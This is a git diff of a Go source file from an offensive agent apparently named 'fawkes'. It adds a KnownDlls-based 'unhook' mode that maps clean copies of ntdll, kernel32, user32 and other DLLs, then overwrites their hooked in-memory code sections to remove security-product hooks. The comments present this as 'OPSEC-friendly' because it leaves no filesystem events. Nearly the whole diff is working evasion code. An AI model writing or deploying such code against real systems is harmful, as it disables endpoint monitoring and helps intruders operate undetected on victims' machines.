@@ -13,15 +13,29 @@ import (
 	"fawkes/pkg/structs"
 )
 
-// DLL unhooking: read clean DLL from disk, replace hooked .text section in memory
-// Supports ntdll.dll, kernel32.dll, kernelbase.dll, advapi32.dll
+// DLL unhooking: read clean DLL from disk or KnownDlls section, replace hooked .text section
+// Supports ntdll.dll, kernel32.dll, kernelbase.dll, advapi32.dll, user32.dll
 
-// New kernel32 procs needed for file mapping
+// Kernel32 procs for file mapping
 var (
 	procCreateFileMappingW = kernel32.NewProc("CreateFileMappingW")
 	procMapViewOfFile      = kernel32.NewProc("MapViewOfFile")
 	procUnmapViewOfFile    = kernel32.NewProc("UnmapViewOfFile")
 	procVirtualProtectUH   = kernel32.NewProc("VirtualProtect")
+)
+
+// Ntdll procs for KnownDlls section access
+var (
+	procNtOpenSection       = ntdll.NewProc("NtOpenSection")
+	procNtMapViewOfSection  = ntdll.NewProc("NtMapViewOfSection")
+	procNtClose             = ntdll.NewProc("NtClose")
+)
+
+// KnownDlls constants
+const (
+	sectionMapRead     = 0x0004
+	objCaseInsensitive = 0x00000040
+	viewUnmap          = 1
 )
 
 // File mapping constants
@@ -64,7 +78,7 @@ type imageSectionHeader struct {
 }
 
 // Supported DLLs for unhooking
-var unhookableDLLs = []string{"ntdll.dll", "kernel32.dll", "kernelbase.dll", "advapi32.dll"}
+var unhookableDLLs = []string{"ntdll.dll", "kernel32.dll", "kernelbase.dll", "advapi32.dll", "user32.dll"}
 
 // NtdllUnhookCommand implements the ntdll-unhook command
 type NtdllUnhookCommand struct{}
@@ -79,7 +93,8 @@ func (c *NtdllUnhookCommand) Description() string {
 
 type ntdllUnhookArgs struct {
 	Action string `json:"action"` // unhook, check
-	DLL    string `json:"dll"`    // ntdll.dll, kernel32.dll, kernelbase.dll, advapi32.dll, all
+	DLL    string `json:"dll"`    // ntdll.dll, kernel32.dll, kernelbase.dll, advapi32.dll, user32.dll, all
+	Source string `json:"source"` // disk (default), knowndlls
 }
 
 func (c *NtdllUnhookCommand) Execute(task structs.Task) structs.CommandResult {
@@ -98,6 +113,9 @@ func (c *NtdllUnhookCommand) Execute(task structs.Task) structs.CommandResult {
 	if args.DLL == "" {
 		args.DLL = "ntdll.dll"
 	}
+	if args.Source == "" {
+		args.Source = "disk"
+	}
 
 	// Determine which DLLs to operate on
 	var targetDLLs []string
@@ -107,12 +125,20 @@ func (c *NtdllUnhookCommand) Execute(task structs.Task) structs.CommandResult {
 		targetDLLs = []string{args.DLL}
 	}
 
+	useKnownDlls := strings.ToLower(args.Source) == "knowndlls"
+
 	switch strings.ToLower(args.Action) {
 	case "unhook":
 		var sb strings.Builder
 		allSuccess := true
 		for _, dll := range targetDLLs {
-			output, err := unhookDLL(dll)
+			var output string
+			var err error
+			if useKnownDlls {
+				output, err = unhookDLLFromKnownDlls(dll)
+			} else {
+				output, err = unhookDLL(dll)
+			}
 			sb.WriteString(output)
 			if err != nil {
 				sb.WriteString(fmt.Sprintf("[!] Error unhooking %s: %v\n", dll, err))
@@ -398,4 +424,111 @@ func minUintptr(a, b uintptr) uintptr {
 		return a
 	}
 	return b
+}
+
+// unhookDLLFromKnownDlls restores a DLL's .text section using the KnownDlls
+// section object instead of reading from disk. This avoids CreateFileW on
+// system DLLs, which is more OPSEC-friendly (no filesystem events).
+func unhookDLLFromKnownDlls(dllName string) (string, error) {
+	var output string
+	output += fmt.Sprintf("[*] %s Unhooking (source: KnownDlls)\n", dllName)
+
+	// Step 1: Get in-memory base address
+	dllNameW, _ := syscall.UTF16PtrFromString(dllName)
+	dllBase, _, _ := procGetModuleHandleW.Call(uintptr(unsafe.Pointer(dllNameW)))
+	if dllBase == 0 {
+		return output, fmt.Errorf("module %s not loaded", dllName)
+	}
+	output += fmt.Sprintf("[*] In-memory base: 0x%X\n", dllBase)
+
+	// Step 2: Open the KnownDlls section object
+	// Section name: \KnownDlls\dllname
+	sectionName := `\KnownDlls\` + dllName
+	nameUTF16, _ := syscall.UTF16FromString(sectionName)
+	us := UNICODE_STRING{
+		Length:        uint16(len(sectionName) * 2),
+		MaximumLength: uint16((len(sectionName) + 1) * 2),
+		Buffer:        &nameUTF16[0],
+	}
+
+	var oa OBJECT_ATTRIBUTES
+	oa.Length = uint32(unsafe.Sizeof(oa))
+	oa.ObjectName = uintptr(unsafe.Pointer(&us))
+	oa.Attributes = objCaseInsensitive
+
+	var sectionHandle uintptr
+	status, _, _ := procNtOpenSection.Call(
+		uintptr(unsafe.Pointer(&sectionHandle)),
+		uintptr(sectionMapRead),
+		uintptr(unsafe.Pointer(&oa)),
+	)
+	if status != 0 {
+		return output, fmt.Errorf("NtOpenSection failed (NTSTATUS: 0x%X) — %s may not be in KnownDlls", status, dllName)
+	}
+	defer procNtClose.Call(sectionHandle)
+
+	// Step 3: Map the section into our address space
+	var mappedBase uintptr
+	var viewSize uintptr
+	status, _, _ = procNtMapViewOfSection.Call(
+		sectionHandle,
+		^uintptr(0), // NtCurrentProcess() = -1
+		uintptr(unsafe.Pointer(&mappedBase)),
+		0, // ZeroBits
+		0, // CommitSize
+		0, // SectionOffset
+		uintptr(unsafe.Pointer(&viewSize)),
+		uintptr(viewUnmap), // InheritDisposition = ViewUnmap
+		0,                  // AllocationType
+		uintptr(pageReadonly),
+	)
+	if status != 0 {
+		return output, fmt.Errorf("NtMapViewOfSection failed (NTSTATUS: 0x%X)", status)
+	}
+	defer procUnmapViewOfFile.Call(mappedBase)
+	output += fmt.Sprintf("[*] KnownDlls section mapped at: 0x%X (no disk read)\n", mappedBase)
+
+	// Step 4: Parse PE headers to find .text section
+	textSection, err := findTextSection(mappedBase)
+	if err != nil {
+		return output, fmt.Errorf("PE parsing failed: %v", err)
+	}
+
+	textVA := uintptr(textSection.VirtualAddress)
+	textSize := uintptr(textSection.SizeOfRawData)
+	output += fmt.Sprintf("[*] .text section: RVA=0x%X, Size=%d bytes\n", textVA, textSize)
+
+	cleanTextAddr := mappedBase + textVA
+	hookedTextAddr := dllBase + textVA
+
+	// Step 5: VirtualProtect the hooked .text to PAGE_EXECUTE_READWRITE
+	var oldProtect uint32
+	ret, _, err2 := procVirtualProtectUH.Call(
+		hookedTextAddr,
+		textSize,
+		uintptr(PAGE_EXECUTE_READWRITE),
+		uintptr(unsafe.Pointer(&oldProtect)),
+	)
+	if ret == 0 {
+		return output, fmt.Errorf("memory protection change (RWX) failed: %v", err2)
+	}
+
+	// Step 6: Copy clean .text over hooked .text
+	cleanSlice := unsafe.Slice((*byte)(unsafe.Pointer(cleanTextAddr)), textSize)
+	hookedSlice := unsafe.Slice((*byte)(unsafe.Pointer(hookedTextAddr)), textSize)
+	bytesCopied := copy(hookedSlice, cleanSlice)
+
+	// Step 7: Restore original memory protection
+	var discardProtect uint32
+	procVirtualProtectUH.Call(
+		hookedTextAddr,
+		textSize,
+		uintptr(oldProtect),
+		uintptr(unsafe.Pointer(&discardProtect)),
+	)
+
+	output += fmt.Sprintf("[+] Restored %d bytes of .text section (from KnownDlls — no disk I/O)\n", bytesCopied)
+	output += fmt.Sprintf("[+] %s successfully unhooked via KnownDlls section\n", dllName)
+
+	return output, nil
 }
